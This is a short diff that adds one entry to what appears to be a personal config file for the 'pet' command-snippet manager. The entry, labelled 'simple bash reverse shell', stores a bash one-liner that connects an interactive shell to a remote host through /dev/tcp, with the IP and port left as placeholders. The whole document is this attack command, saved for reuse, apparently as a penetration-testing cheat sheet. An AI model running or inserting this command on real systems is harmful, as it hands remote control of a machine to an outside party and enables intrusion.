@@ -1,0 +1,7 @@
+
+[[Snippets]]
+  Description = "simple bash reverse shell"
+  Filename = "/Users/s_kmr/.config/pet/snippet.toml"
+  Output = ""
+  Tag = []
+  command = "bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"
